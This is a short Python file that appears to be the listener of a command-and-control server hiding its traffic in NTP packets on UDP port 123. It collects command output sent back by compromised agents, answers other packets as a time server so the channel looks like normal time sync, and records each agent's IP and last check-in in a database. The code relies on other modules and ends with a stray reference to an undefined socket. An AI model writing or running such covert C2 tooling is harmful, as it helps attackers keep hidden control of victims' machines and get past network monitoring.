"""
sole purpose is to listen consistenty for NTP traffic
if resync is recieved, send to ntpserver.py
if cmdoutput is received, send to c2.py
"""
import socket
import datetime

from server import ntpserver, c2


def start(agentDB):
    
    serverip = "0.0.0.0"
    port = 123

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((serverip, port))


    datahold = ""
    while True:
        data, addr = sock.recvfrom(2048)
        ip = addr[0]
        #print(data, addr)

        strdata = c2.decode(data)

        if "COM" in strdata:
            idx = strdata.index("COM")
            datahold += strdata[idx+4:]
            if "COMQ" in strdata:
                c2.printOutput(datahold, ip)
                datahold = ""

        else: #this means resync/ping
            print(ip)
            ntpserver.resync(sock, data, addr)
            print('timestamping')
            timestamp = "{:%Y-%m-%d %H:%M:%S}".format(datetime.datetime.now())
            print("adding to db")
            agentDB.aliveStatus(ip, timestamp)

            


    s.close()


